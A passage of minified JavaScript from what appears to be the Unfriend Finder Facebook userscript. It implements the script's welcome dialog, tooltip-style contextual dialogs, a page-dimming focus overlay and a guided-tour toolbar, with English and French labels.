content.insertBefore(welcomebox.window,content.firstElementChild);var i=1;welcomebox.buttons.forEach(function(button){var span=new xHTMLElement({element:"span",className:"uiButton uiButtonLarge",parentNode:getFromId("dialog_buttons_"+welcomebox.id)}).getElement();if(button.type=="green"){CSS3.addClass(span,"uiButtonSpecial UIButton_Green")}else{if(button.type=="gray"){CSS3.addClass(span,"UIButton_Gray uiButtonDefault")}else{CSS3.addClass(span,"UIButton_Blue uiButtonConfirm")}}var buttonElement=new xHTMLElement({element:"input",className:"UIButton_Text",type:"button",id:button.id,name:button.name,value:button.value,disabled:button.disabled,parentNode:span,debug:true,listeners:{click:button.handler}}).getElement();
if(button.closer){EventMgr.addListener(buttonElement,EventMgr.EVENTS.click,welcomebox.Hide)}});CSS3.display(getFromId("dialog_content_"+welcomebox.id),CSS3.DISPLAY.block);getFromId("dialog_title_welcomeFacebox").innerHTML='<strong class="en_US">Welcome</strong><strong class="fr_FR">Bienvenue</strong>';welcomebox.makeDraggable();return welcomebox};welcomebox.makeDraggable=function welcomeboxMakeDraggable(){EventMgr.addListener(getFromId("dialog_h2_"+welcomebox.id),EventMgr.EVENTS.mousedown,function(e){welcomebox.draggable=true;
welcomebox.start={};welcomebox.window.firstElementChild.style.position="relative";welcomebox.start.left=e.clientX;welcomebox.start.top=e.clientY;welcomebox.left=welcomebox.window.firstElementChild.style.left.replace("px","");welcomebox.top=welcomebox.window.firstElementChild.style.top.replace("px","")});EventMgr.addListener(document,EventMgr.EVENTS.mousemove,function(e){if(welcomebox.draggable){welcomebox.window.firstElementChild.style.left=(welcomebox.left-(welcomebox.start.left-e.clientX))+"px";
welcomebox.window.firstElementChild.style.top=(welcomebox.top-(welcomebox.start.top-e.clientY))+"px"}});EventMgr.addListener(document,EventMgr.EVENTS.mouseup,function(){welcomebox.draggable=false})};welcomebox.progressTo=function welcomeboxProgressTo(to){var from=parseInt(getFromId("welcome_progress").innerHTML.replace("%",""),10);from=from+1;getFromId("welcome_progress").style.width=from+"%";getFromId("welcome_progress").innerHTML=from+"%";if(from<to){setTimeout(function(){welcomebox.progressTo(to)
},15)}else{getFromId("welcome_progress").innerHTML=from+"%"}};welcomebox.Destroy=function welcomeboxDestroy(){try{(getFromId("content")?getFromId("content"):Params.body).removeChild(welcomebox.window)}catch(exception){}};welcomebox.slideCard=function welcomeboxSlideCard(){var l=getFromId("uf_cards").style.left.replace("px","");if(l==0){welcomebox.slideCardTo("-600");welcomebox.progressTo(20)}else{if(l=="-600"){welcomebox.slideCardTo("-1200");welcomebox.progressTo(40)}else{if(l=="-1200"){welcomebox.slideCardTo("-1800");
welcomebox.progressTo(60)}else{if(l=="-1800"){welcomebox.slideCardTo("-2400");welcomebox.progressTo(80)}else{if(l=="-2400"){welcomebox.slideCardTo("-3000");welcomebox.progressTo(100)}}}}}};welcomebox.slideCardTo=function welcomeboxSlideCardTo(to){var from=parseInt(getFromId("uf_cards").style.left.replace("px",""))-30,fbDockWrapper;welcomebox.currentCard=1;getFromId("uf_cards").style.left=from+"px";if(from>to){setTimeout(function(){welcomebox.slideCardTo(to)},15)}else{if(to=="-600"){welcomebox.currentCard=2;
getFromId("dialog_title_welcomeFacebox").innerHTML='<strong class="en_US">Step 2/6: Welcome</strong><strong class="fr_FR">Etape 2/6: Bienvenue</strong>';CSS3.display(getFromId("dialog_header_close_"+welcomebox.id),CSS3.DISPLAY.block);Registry.setKey("coreStarted","1")}else{if(to=="-1200"){welcomebox.currentCard=3;getFromId("dialog_title_welcomeFacebox").innerHTML='<strong class="en_US">Step 3/6: Help</strong><strong class="fr_FR">Etape 3/6: Aide</strong>';core.focus.focusOn(getFromId("fb_menu_unfriends")||null);
if(fbDockWrapper=getFromClass("fbDockWrapper")[0]){fbDockWrapper.style.zIndex="305"}}else{if(to=="-1800"){welcomebox.currentCard=4;core.focus.stop();if(fbDockWrapper=getFromClass("fbDockWrapper")[0]){fbDockWrapper.style.zIndex=""}getFromId("content").style.marginTop="0px";getFromId("dialog_title_welcomeFacebox").innerHTML='<strong class="en_US">Step 4/6: Help</strong><strong class="fr_FR">Etape 4/6: Aide</strong>'}else{if(to=="-2400"){welcomebox.currentCard=5;getFromId("dialog_title_welcomeFacebox").innerHTML='<strong class="en_US">Step 5/6: Settings</strong><strong class="fr_FR">Etape 5/6: Paramètres</strong>'
}else{if(to=="-3000"){welcomebox.currentCard=6;getFromId("dialog_title_welcomeFacebox").innerHTML='<strong class="en_US">Step 6/6: Finish</strong><strong class="fr_FR">Etape 6/6: Terminer</strong>';CSS3.hide(getFromId("next_button").parentNode);CSS3.display(getFromId("close_button").parentNode,CSS3.DISPLAY.inlineBlock)}}}}}}};welcomebox.Show=function welcomeboxShow(){try{if(welcomebox.overlay){welcomebox.overlay.Show()}welcomebox.fadeIn()}catch(exception){}};welcomebox.fadeIn=function welcomeboxFadeIn(){if(!welcomebox.fade){if(welcomebox.loading){setTimeout(welcomebox.ShowEnd,welcomebox.timeout)
}else{welcomebox.ShowEnd()}welcomebox.window.style.opacity=1;return welcomebox}else{if(welcomebox.window.style.opacity>=1){if(welcomebox.loading){setTimeout(welcomebox.ShowEnd,welcomebox.timeout)}else{welcomebox.ShowEnd()}return welcomebox}welcomebox.window.style.opacity=parseFloat(welcomebox.window.style.opacity)+Params.Facebox.Fades.Step;setTimeout(welcomebox.fadeIn,Params.Facebox.Fades.Timer)}};welcomebox.ShowEnd=function welcomeboxShowEnd(){if(welcomebox.card1){getFromId("welcomeBox_card1").appendChild(welcomebox.card1)
}if(welcomebox.card2){getFromId("welcomeBox_card2").appendChild(welcomebox.card2)}if(welcomebox.card3){getFromId("welcomeBox_card3").appendChild(welcomebox.card3)}if(welcomebox.card4){getFromId("welcomeBox_card4").appendChild(welcomebox.card4)}if(welcomebox.card5){getFromId("welcomeBox_card5").appendChild(welcomebox.card5)}if(welcomebox.card6){getFromId("welcomeBox_card6").appendChild(welcomebox.card6)}CSS3.hide(getFromId("close_button").parentNode);EventMgr.addListener(getFromId("dummy_alert_en_US"),EventMgr.EVENTS.click,function(){core.notify({id:"007",text:"James Bond",type:"unfriend",status:"unfriend",beeper:true});
core.notify({id:"008",text:"Cameron Diaz",type:"ignored",status:null,beeper:false})});EventMgr.addListener(getFromId("dummy_alert_id_ID"),EventMgr.EVENTS.click,function(){core.notify({id:"007",text:"James Bond",type:"unfriend",status:"unfriend",beeper:true});core.notify({id:"008",text:"Cameron Diaz",type:"ignored",status:null,beeper:true})});EventMgr.addListener(getFromId("startTour"),EventMgr.EVENTS.click,function(){welcomebox.Hide();getFromId("content").style.marginTop="0px";core.showingWelcome=false;
Registry.setKey(core.user_id+"_takeTour","1");core.initTour();checkForUpdate(false)});EventMgr.addListener(getFromId("quickOption1"),EventMgr.EVENTS.change,function(){Params.settings.deactivated=getFromId("quickOption1").checked;saveSettings();if(getFromId("deactivated")){getFromId("deactivated").checked=getFromId("quickOption1").checked}});EventMgr.addListener(getFromId("quickOption2"),EventMgr.EVENTS.change,function(){Params.settings.notifIgnored=getFromId("quickOption2").checked;saveSettings();
if(getFromId("notifIgnored")){getFromId("notifIgnored").checked=getFromId("quickOption2").checked}});EventMgr.addListener(getFromId("quickOption3"),EventMgr.EVENTS.change,function(){Params.settings.hideInMenubar=getFromId("quickOption3").checked;saveSettings();if(getFromId("hideInMenubar")){getFromId("hideInMenubar").checked=getFromId("quickOption3").checked}core.menubar.build()});EventMgr.addListener(getFromId("quickOption4"),EventMgr.EVENTS.change,function(){Params.settings.onlyShowNewUnfriends=getFromId("quickOption4").checked;
saveSettings();if(getFromId("onlyShowNewUnfriends")){getFromId("onlyShowNewUnfriends").checked=getFromId("quickOption4").checked}core.filter.setValue({unfriends:{counter:{value:core.getCounter()}}})});EventMgr.addListener(getFromId("quickOption5"),EventMgr.EVENTS.change,function(){Params.settings.showTime=getFromId("quickOption5").checked;saveSettings();if(getFromId("showTime")){getFromId("showTime").checked=getFromId("quickOption5").checked}});EventMgr.addListener(getFromId("dialog_header_close_"+welcomebox.id),EventMgr.EVENTS.click,function(){if(welcomebox.currentCard<3){Registry.setKey(core.user_id+"_takeTour","1");
core.initTour()}welcomebox.Hide();getFromId("content").style.marginTop="0px";core.showingWelcome=false;checkForUpdate(false)});getFromId("dialog_title_welcomeFacebox").innerHTML='<strong class="en_US">Step 1/6: Welcome</strong><strong class="fr_FR">Etape 1/6: Bienvenue</strong>';CSS3.setClass(getFromId("dialog_content_"+welcomebox.id).parentNode,"dialog_content");CSS3.setClass(getFromId("dialog_h2_"+welcomebox.id),"dialog_title")};welcomebox.Hide=function welcomeboxHide(){if(welcomebox.overlay){welcomebox.overlay.Hide()
}welcomebox.fadeOut()};welcomebox.fadeOut=function welcomeboxFadeOut(){if(!welcomebox.fade){welcomebox.Destroy()}else{if(welcomebox.window.style.opacity<=parseFloat(0.03)){welcomebox.Destroy();return welcomebox}welcomebox.window.style.opacity=parseFloat(welcomebox.window.style.opacity)-Params.Facebox.Fades.Step;setTimeout(welcomebox.fadeOut,Params.Facebox.Fades.Timer)}};WelcomeBox.prototype.valueOf=function(){return welcomebox.me};WelcomeBox.prototype.getButton=function(i){return welcomebox.buttons[i]
};welcomebox.Build();new GoogleAnalytics({account:"UA-25017297-5"});if(welcomebox.buttons.length==0){getFromId("dialog_buttons_"+welcomebox.id).parentNode.removeChild(getFromId("dialog_buttons_"+welcomebox.id));getFromId("dialog_content_"+welcomebox.id).style.borderBottom="none"}getFromId("dialog_title_"+welcomebox.id).innerHTML=welcomebox.title;if(welcomebox.loading){getFromId("dialog_body_"+welcomebox.id).innerHTML="Loading...";CSS3.setClass(getFromId("dialog_content_"+welcomebox.id).parentNode,"dialog_loading")
}else{CSS3.setClass(getFromId("dialog_content_"+welcomebox.id).parentNode,"dialog_content")}welcomebox.toString=function toString(){return"[object WelcomeBox]"};return this};var ContextualDialog=function ContextualDialog(__constructor){var contextual=this;Extend(contextual,__constructor);if(!contextual.context){return}if((!contextual.id)||(!contextual.title)||(!contextual.body)){throw (new Error("ContextualDialog() : Please give ID, Title and Body in object constructor"));return}if(!contextual.context instanceof HTMLElement){throw (new Error("ContextualDialog() : Context must be a DOMElement."));
return}if(getFromId("contextualdialog_"+contextual.id)){return}contextual.Build=function contextualBuild(){contextual.test=contextual.context;contextual.isFixed=null;while(contextual.test.parentNode&&!contextual.isFixed){if(contextual.test.id=="pageHead"){contextual.isFixed=true}contextual.test=contextual.test.parentNode}delete contextual.test;if(contextual.isFixed){getFromId("pageHead").style.position="relative"}contextual.container=(contextual.isFixed?getFromId("pageHead"):getFromId("mainContainer"));
contextual.style="width: "+(contextual.width||300)+"px;";switch((__constructor.arrow?__constructor.arrow:"top")){case"left":var xPos=0;var yPos=0;xPos+=CSS3.getElementPosition(contextual.context).left;xPos-=CSS3.getElementPosition(contextual.container).left;xPos+=1*CSS3.getStyle(contextual.context).paddingLeft.replace("px","");xPos+=1*CSS3.getStyle(contextual.context).paddingRight.replace("px","");xPos+=CSS3.getSize(contextual.context).width;yPos+=CSS3.getElementPosition(contextual.context).top;yPos-=CSS3.getElementPosition(contextual.container).top;
yPos-=23;if(contextual.align=="middle"){yPos+=(CSS3.getSize(contextual.context,true).height/2)}if(contextual.shift){xPos+=contextual.shift}if(contextual.margin){yPos+=contextual.margin}contextual.arrowStyle="top: 16px; margin-top: 0px;";contextual.arrowClass="uiOverlayArrowLeft";contextual.arrowClass="Left";contextual.arrowOrientation="uiContextualDialogRight";break;case"right":var xPos=0;var yPos=0;xPos+=CSS3.getElementPosition(contextual.context).left;xPos-=CSS3.getElementPosition(contextual.container).left;
yPos+=CSS3.getElementPosition(contextual.context).top;yPos-=CSS3.getElementPosition(contextual.container).top;yPos-=23;if(contextual.align=="middle"){yPos+=(CSS3.getSize(contextual.context,true).height/2)}if(contextual.shift){xPos+=contextual.shift}if(contextual.margin){yPos+=contextual.margin}contextual.arrowStyle="top: 16px; margin-top: 0px;";contextual.arrowClass="uiOverlayArrowRight";contextual.arrowClass="Right";contextual.arrowOrientation="uiContextualDialogLeft";break;case"bottom-right":var xPos=0;
var yPos=0;xPos+=CSS3.getElementPosition(contextual.context).left;xPos-=CSS3.getElementPosition(contextual.container).left;xPos-=23;yPos+=CSS3.getElementPosition(contextual.context).top;yPos-=CSS3.getElementPosition(contextual.container).top;if(contextual.align=="middle"){xPos+=(CSS3.getSize(contextual.context,true).width/2)}if(contextual.shift){xPos+=contextual.shift}if(contextual.margin){yPos+=contextual.margin}contextual.arrowStyle="left: 15px;";contextual.arrowClass="uiOverlayArrowBottom uiOverlayWithFooterArrowBottom";
contextual.arrowClass="Bottom";contextual.arrowOrientation="uiContextualDialogAbove";break;case"top-left":var xPos=0;var yPos=0;xPos+=CSS3.getElementPosition(contextual.context).left;xPos-=CSS3.getElementPosition(contextual.container).left;xPos-=23;yPos+=CSS3.getElementPosition(contextual.context).top;yPos-=CSS3.getElementPosition(contextual.container).top;yPos+=CSS3.getSize(contextual.context).height;if(contextual.align=="middle"){xPos+=(CSS3.getSize(contextual.context,true).width/2)}if(contextual.shift){xPos+=contextual.shift
}if(contextual.margin){yPos+=contextual.margin}contextual.arrowStyle="left: 15px;";contextual.arrowClass="uiOverlayArrowTop";contextual.arrowClass="Top";contextual.arrowOrientation="uiContextualDialogBelow";break;case"top-right":var xPos=0;var yPos=0;xPos+=CSS3.getElementPosition(contextual.context).left;xPos-=CSS3.getElementPosition(contextual.container).left;xPos+=23;yPos+=CSS3.getElementPosition(contextual.context).top;yPos-=CSS3.getElementPosition(contextual.container).top;yPos+=CSS3.getSize(contextual.context).height;
if(contextual.align=="middle"){xPos+=(CSS3.getSize(contextual.context,true).width/2)}if(contextual.shift){xPos+=contextual.shift}if(contextual.margin){yPos+=contextual.margin}contextual.arrowStyle="right: 15px;";contextual.arrowClass="uiOverlayArrowTop";contextual.arrowClass="Top";contextual.arrowOrientation="uiContextualDialogBelow";contextual.style+=" margin-left: -"+(contextual.width||300)+"px;";break;case"bottom-left":var xPos=0;var yPos=0;xPos+=CSS3.getElementPosition(contextual.context).left;
xPos-=CSS3.getElementPosition(contextual.container).left;xPos+=23;yPos+=CSS3.getElementPosition(contextual.context).top;yPos-=CSS3.getElementPosition(contextual.container).top;if(contextual.align=="middle"){xPos+=(CSS3.getSize(contextual.context,true).width/2)}if(contextual.shift){xPos+=contextual.shift}if(contextual.margin){yPos+=contextual.margin}contextual.arrowStyle="right: 15px;";contextual.arrowClass="uiContextualDialogArrowTop uiContextualDialogWithFooterArrowTop";contextual.arrowClass="Bottom";
contextual.arrowOrientation="uiContextualDialogAbove";contextual.style+=" margin-left: -"+(contextual.width||300)+"px;";break}if(contextual.noArrow){contextual.arrowStyle="display: none;"}contextual.hint=contextual.hint||"";contextual.dialog=new xHTMLElement({element:"div",id:"contextualdialog_"+contextual.id,className:"ContextualDialog uiContextualDialogPositioner uiContextualDialogFixed "+contextual.arrowOrientation,style:{zIndex:400,opacity:"0",position:(contextual.isFixed?"absolute":"absolute"),left:xPos+"px",top:yPos+"px",},innerHTML:parseTemplate('    <div class="uiOverlay uiContextualDialog uiContextualDialogArrow::arrowClass:: uiContextualDialogWithFooterArrow::arrowClass::" style="::style::">        <div class="uiOverlayContent">            <div style="color:#333333" class="uiContextualDialogContent uiContextualDialogDefaultPadding">                <div class="uiHeader mbs">                    <div class="clearfix uiHeaderTop">                        <div>                            <h3 class="uiHeaderTitle" style="font-size:13px;">::title::</h3>                        </div>                    </div>                </div>                <div style="font-weight:normal">::body::</div>            </div>            <div id="contextual_buttonscontainer_::id::" class="uiOverlayFooter uiContextualDialogFooter uiBoxGray topborder">                <div id="contextual_hint_::id::" style="float:left; margin-top:6px;">::hint::</div>                <a href="'+Params.links.update+'" id="contextual_button_::id::_update" style="display: none; height: 18px;" name="next" role="button" class="uiOverlayButton uiOverlayCancelButton uiButton uiButtonConfirm">                    <span class="uiButtonText">::btn_update::</span>                </a>                <a id="contextual_button_::id::_like" style="display: none; height: 18px; width:40px;" name="next" role="button" class="uiOverlayButton uiOverlayCancelButton uiButton uiButtonConfirm">                    <span class="uiButtonText">::btn_like::</span>                </a>                <a id="contextual_button_::id::_next" style="display: none; height: 18px;" name="next" role="button" class="uiOverlayButton uiOverlayCancelButton uiButton uiButtonConfirm">                    <span class="uiButtonText">::btn_next:: <i class="mls img tourNext"></i></span>                </a>                <a id="contextual_button_::id::_finish" style="display: none; height: 18px;" name="finish" role="button" class="uiOverlayButton uiOverlayCancelButton uiButton">                    <span class="uiButtonText">::btn_finish::</span>                </a>                <a id="contextual_button_::id::_close" style="display: none; height: 18px;" name="close" role="button" class="uiOverlayButton uiOverlayCancelButton uiButton">                    <span class="uiButtonText">::btn_close::</span>                </a>            </div>        </div>        <i style="::arrowStyle::" class="uiContextualDialogArrow"></i>    </div>',{params:Extend({btn_close:LANG.btn_ok,btn_next:LANG.btn_next,btn_finish:"Finish tour",btn_update:"Update",btn_like:"Like !"},contextual)}),parentNode:contextual.container}).getElement();
if(!contextual.buttons){CSS3.hide(getFromId("contextual_buttonscontainer_"+contextual.id));contextual.buttons={}}if(contextual.buttons.close){CSS3.display(getFromId("contextual_button_"+contextual.id+"_close"),CSS3.DISPLAY.inlineBlock)}if(contextual.buttons.update){CSS3.display(getFromId("contextual_button_"+contextual.id+"_update"),CSS3.DISPLAY.inlineBlock)}if(contextual.buttons.next){CSS3.display(getFromId("contextual_button_"+contextual.id+"_next"),CSS3.DISPLAY.inlineBlock)}if(contextual.buttons.like){CSS3.display(getFromId("contextual_button_"+contextual.id+"_like"),CSS3.DISPLAY.inlineBlock)
}if(contextual.buttons.finish){CSS3.display(getFromId("contextual_button_"+contextual.id+"_finish"),CSS3.DISPLAY.inlineBlock)}EventMgr.addListener(getFromId("contextual_button_"+contextual.id+"_close"),"click",function(){contextual.Destroy();if(contextual.hasOverlay){core.focus.stop()}if(typeof contextual.close=="function"){contextual.close()}});EventMgr.addListener(getFromId("contextual_button_"+contextual.id+"_update"),"click",function(){contextual.Destroy()});EventMgr.addListener(getFromId("contextual_button_"+contextual.id+"_next"),"click",function(){contextual.Destroy();
if(typeof contextual.next=="function"){contextual.next()}});EventMgr.addListener(getFromId("contextual_button_"+contextual.id+"_finish"),"click",function(){core.tour.finish();core.focus.stop()});EventMgr.addListener(getFromId("contextual_button_"+contextual.id+"_like"),"click",function(){getFromId("contextual_button_"+contextual.id+"_like").innerHTML='<span class="uiButtonText"><img src="'+Params.images.smallIndicator+'" style="height: 11px; margin: 2px 3px;" /></span>';core.becomeFan({id:"120349238092887",reload:false});
setTimeout(function(){contextual.Destroy()},1000)});if(contextual.overlay){contextual.hasOverlay=true;core.focus.focusOn(contextual.context,contextual.halo)}};contextual.Show=function contextualShow(){void (0)};contextual.Destroy=function contextualDestroy(){contextual.container.removeChild(contextual.dialog);try{delete core.dialogs[contextual.id]}catch(exception){new ErrorHandler(exception,"contextual.Destroy")}};contextual.Show=function contextualShow(){contextual.dialog.style.opacity=1};contextual.Hide=function contextualHide(){contextual.dialog.style.opacity=0;
contextual.Destroy()};contextual.getElement=function contextualGetElement(){return contextual.dialog};contextual.toString=function toString(){return"[object ContextualDialog [@id="+contextual.id+"]]"};contextual.Build();return contextual};var Focus=function Focus(){var focus=this;focus.opacity=0.8;focus.color="white";focus.build=function(){focus.bodyLeft=new xHTMLElement({element:"div",id:"focusBodyLeft",style:{position:"absolute",display:CSS3.DISPLAY.none,opacity:focus.opacity,zIndex:150,background:focus.color||"red"},parentNode:getFromId("globalContainer")}).getElement();
focus.bodyRight=new xHTMLElement({element:"div",id:"focusBodyRight",style:{position:"absolute",display:CSS3.DISPLAY.none,opacity:focus.opacity,zIndex:150,background:focus.color||"blue"},parentNode:getFromId("globalContainer")}).getElement();focus.headerLeft=new xHTMLElement({element:"div",id:"focusHeaderLeft",style:{position:"absolute",display:CSS3.DISPLAY.none,opacity:focus.opacity,zIndex:150,background:focus.color||"yellow"},parentNode:getFromId("pageHead")}).getElement();focus.headerRight=new xHTMLElement({element:"div",id:"focusHeaderRight",style:{position:"absolute",display:CSS3.DISPLAY.none,opacity:focus.opacity,zIndex:150,background:focus.color||"silver"},parentNode:getFromId("pageHead")}).getElement();
focus.pageFooter=new xHTMLElement({element:"div",id:"focusPageFooter",style:{position:"absolute",display:CSS3.DISPLAY.none,opacity:focus.opacity,zIndex:150,background:focus.color||"lime"},parentNode:getFromId("globalContainer")}).getElement();focus.notContainer=new xHTMLElement({element:"div",id:"focusNotContainer",style:{position:"absolute",display:CSS3.DISPLAY.none,opacity:focus.opacity,zIndex:150,background:focus.color||"navy"}}).getElement();focus.container=new xHTMLElement({element:"div",id:"focusContainer",style:{position:"absolute",display:CSS3.DISPLAY.none}}).getElement();
focus.top=new xHTMLElement({element:"div",id:"focusTop",style:{position:"absolute",display:CSS3.DISPLAY.none,background:focus.color||"maroon",opacity:focus.opacity,zIndex:150},parentNode:focus.container}).getElement();focus.right=new xHTMLElement({element:"div",id:"focusRight",style:{position:"absolute",display:CSS3.DISPLAY.none,background:focus.color||"black",opacity:focus.opacity,zIndex:150},parentNode:focus.container}).getElement();focus.bottom=new xHTMLElement({element:"div",id:"focusBottom",style:{position:"absolute",display:CSS3.DISPLAY.none,background:focus.color||"#FF017D",opacity:focus.opacity,zIndex:150},parentNode:focus.container}).getElement();
focus.left=new xHTMLElement({element:"div",id:"focusLeft",style:{position:"absolute",display:CSS3.DISPLAY.none,background:focus.color||"gray",opacity:focus.opacity,zIndex:150},parentNode:focus.container}).getElement();focus.center=new xHTMLElement({element:"div",id:"focusCenter",style:{position:"absolute",display:CSS3.DISPLAY.none||"green",background:focus.color,opacity:"0",zIndex:150},parentNode:focus.container}).getElement()};focus.focusOn=function(element,halo){if(!element){element=new xHTMLElement({element:"input",id:"dummyElement",type:"hidden",parentNode:Params.body,before:Params.body.firstElementChild}).getElement()
}focus.element=element;focus.tempBorder=null;if(halo){focus.tempBorder=focus.element.style.border;focus.element.style.border="2px solid red";focus.tempMargin=focus.element.style.margin;focus.element.style.margin="-2px"}focus.test=focus.element;focus.isFixed=null;while(focus.test.parentNode&&!focus.isFixed){if(focus.test.id=="pageHead"){focus.isFixed=true}focus.test=focus.test.parentNode}delete focus.test;CSS3.removeClass(getFromId("facebook"),"tinyViewport");focus.update(element)};focus.update=function(element){var container=(focus.isFixed?getFromId("pageHead"):getFromId("content"));
var notContainer=(focus.isFixed?getFromId("content"):getFromId("pageHead"));Params.body.style.overflow="hidden";notContainer.appendChild(focus.notContainer);container.appendChild(focus.container);getFromId("pageHead").style.position="relative";CSS3.display(focus.bodyLeft,CSS3.DISPLAY.block);Extend(focus.bodyLeft.style,{left:"0px",top:"0px",width:"2000px",height:"100%",marginLeft:"-2000px"});CSS3.display(focus.bodyRight,CSS3.DISPLAY.block);Extend(focus.bodyRight.style,{left:"0px",top:"0px",width:"2000px",height:"100%",marginLeft:"100%"});
CSS3.display(focus.headerLeft,CSS3.DISPLAY.block);Extend(focus.headerLeft.style,{left:"0px",top:"0px",width:"2000px",height:CSS3.getSize(getFromId("blueBarHolder"),true).height+"px",marginLeft:"-2000px"});CSS3.display(focus.headerRight,CSS3.DISPLAY.block);Extend(focus.headerRight.style,{left:CSS3.getSize(getFromId("pageHead"),true).width+"px",top:"0px",width:"2000px",height:CSS3.getSize(getFromId("blueBarHolder"),true).height+"px",marginLeft:"0px"});CSS3.display(focus.pageFooter,CSS3.DISPLAY.block);
Extend(focus.pageFooter.style,{left:getFromId("pageFooter").offsetLeft+"px",top:getFromId("pageFooter").offsetTop+"px",width:CSS3.getSize(getFromId("pageFooter"),true).width+"px",height:CSS3.getSize(getFromId("pageFooter"),true).height+"px"});CSS3.display(focus.notContainer,CSS3.DISPLAY.block);Extend(focus.notContainer.style,{left:"0px",top:"0px",width:CSS3.getSize(notContainer,true).width+"px",height:CSS3.getSize((!focus.isFixed?getFromId("blueBarHolder"):notContainer),true).height+"px",zIndex:(!focus.isFixed?301:10)});
CSS3.display(focus.container,CSS3.DISPLAY.block);Extend(focus.container.style,{left:"0px",top:"0px",width:CSS3.getSize(container,true).width+"px",height:CSS3.getSize((focus.isFixed?getFromId("blueBarHolder"):container),true).height+"px"});CSS3.display(focus.left,CSS3.DISPLAY.block);var l=focus.element.offsetLeft,c=(focus.isFixed?getFromId("pageHead"):container);Extend(focus.left.style,{left:"0px",top:"0px",width:(focus.element.offsetLeft>=0?focus.element.offsetLeft:0)+"px",height:CSS3.getSize((focus.isFixed?getFromId("blueBarHolder"):container),true).height+"px"});
CSS3.display(focus.center,CSS3.DISPLAY.block);Extend(focus.center.style,{left:focus.element.offsetLeft+"px",top:(CSS3.getElementPosition(focus.element).top-CSS3.getElementPosition(container).top)+"px",width:(CSS3.getSize(focus.element,true).width)+"px",height:(CSS3.getSize(focus.element,true).height)+"px"});CSS3.display(focus.right,CSS3.DISPLAY.block);l=focus.element.offsetLeft+CSS3.getSize(focus.element,true).width;Extend(focus.right.style,{left:l+"px",top:"0px",width:(CSS3.getSize(container,true).width-l)+"px",height:CSS3.getSize((focus.isFixed?getFromId("blueBarHolder"):container),true).height+"px"});
CSS3.display(focus.top,CSS3.DISPLAY.block);Extend(focus.top.style,{left:focus.element.offsetLeft+"px",top:"0px",width:CSS3.getSize(focus.element,true).width+"px",height:focus.element.offsetTop+"px"});CSS3.display(focus.bottom,CSS3.DISPLAY.block);Extend(focus.bottom.style,{left:focus.element.offsetLeft+"px",top:(focus.element.offsetTop+CSS3.getSize(focus.element,true).height)+"px",width:CSS3.getSize(focus.element,true).width+"px",height:(CSS3.getSize((focus.isFixed?getFromId("blueBarHolder"):container),true).height-(focus.element.offsetTop+CSS3.getSize(focus.element,true).height))+"px"})
};focus.stop=function(){Params.body.style.overflow="";CSS3.hide(focus.bodyLeft);CSS3.hide(focus.headerLeft);CSS3.hide(focus.container);CSS3.hide(focus.pageFooter);CSS3.hide(focus.notContainer);CSS3.hide(focus.headerRight);CSS3.hide(focus.bodyRight);if(focus.tempBorder){focus.element.style.border=focus.tempBorder;focus.element.style.margin=focus.tempMargin;delete focus.tempBorder;delete focus.tempMargin}};focus.toString=function toString(){return"[object Focus]"};focus.build();return focus};var UFTour=function UFTour(__constructor){var tour=this;
Extend(tour,__constructor);tour.pieces=[];tour.length=0;tour.listContainer;tour.currentStep=1;tour.build=function(){var content;if(content=getFromId("content")){var toolbarContainer=new xHTMLElement({element:"div",id:"toolbarContainer",style:{display:CSS3.DISPLAY.none,position:"relative",top:"0px !important",},innerHTML:parseTemplate('<div id="pagelet_toolbar" style="margin-bottom: -55px; display: block;">   <div>       <div id="profile_tour_toolbar" title="Unfriend Finder Tour" class="uiMarketingToolbar">           <div class="pvm phl toolbarContentContainer uiBoxLightblue noborder">               <table width="100%" cellspacing="0" cellpadding="0" class="uiGrid">                   <tbody>                       <tr>                           <td class="vMid prl tourLabel" style="padding-right: 16px;">                               <div class="fsl fwb fcb">Unfriend Finder Tour</div>                           </td>                           <td class="vMid tourSteplist toolbarFullbleed">                               <div id="tourContainer" class="uiStepList uiStepListSingleLine"></div>                           </td>                           <td class="vMid">                               <label for="finishTour" class="uiButton">                                   <input type="submit" id="finishTour" value="Finish Tour">                               </label>                           </td>                       </tr>                   </tbody>               </table>           </div>           <div class="toolbarShingle" style="background:none"></div>       </div>   </div></div>',{params:{}})}).getElement();
content.parentNode.insertBefore(toolbarContainer,content);EventMgr.addListener(getFromId("finishTour"),EventMgr.EVENTS.click,function(){tour.finish()});tour.listContainer=new xHTMLElement({element:"ol",parentNode:getFromId("tourContainer")}).getElement();var step;for(step in tour.steps.elements){if(tour.steps.elements.hasOwnProperty(step)){tour.addStep(tour.steps.elements[step])}}}};tour.start=function(){new GoogleAnalytics({account:"UA-25017297-4"});CSS3.addClass(Params.body,"profileTour");CSS3.display(getFromId("toolbarContainer"),CSS3.DISPLAY.block);
setTimeout(function(){tour.showStep(1)},500)};tour.showStep=function(n){if(tour.steps.elements.length==0){return}var i;for(i=1;i<=tour.steps.elements.length;i++){CSS3.removeClass(getFromId("uiStep"+i),"uiStepSelected uiStepNextSelected uiStepLastSelected")}if(tour.length==1){CSS3.addClass(getFromId("uiStep"+n),"uiStepSelected")}else{CSS3.addClass(getFromId("uiStep"+n),"uiStepSelected");CSS3.addClass(getFromId("uiStep"+(n-1)),"uiStepNextSelected");if(n==tour.steps.elements.length){CSS3.addClass(getFromId("uiStep"+n),"uiStepLastSelected")
}}tour.steps.elements[n-1].handler();tour.currentStep=n};tour.nextStep=function(){if(tour.currentStep==tour.steps.elements.length){tour.finish()}else{tour.showStep(++tour.currentStep)}};tour.finish=function(){Registry.setKey(core.user_id+"_takeTour","0");getFromId("toolbarContainer").innerHTML="";CSS3.removeClass(Params.body,"profileTour");core.filter.select("unfriends");core.focus.stop();var box;for(box in core.dialogs){if(/tourFor/.test(box)){core.dialogs[box].Hide()}}};tour.addStep=function(step){tour.pieces.push(step);
tour.length++;var object=new xHTMLElement({element:"li",id:"uiStep"+tour.length,className:"uiStep",innerHTML:parseTemplate('<div class="part back"></div><div class="part middle">   <div class="content">       <span class="title fsm">           <span class="fwb">::id::</span>           <a href="#" id="tour_step_::id::">::name::</a>       </span>   </div></div><div class="part point"></div>',{params:step}),parentNode:tour.listContainer}).getElement();if(step.selected){if(tour.length==1){CSS3.addClass(object,"uiStepSelected")
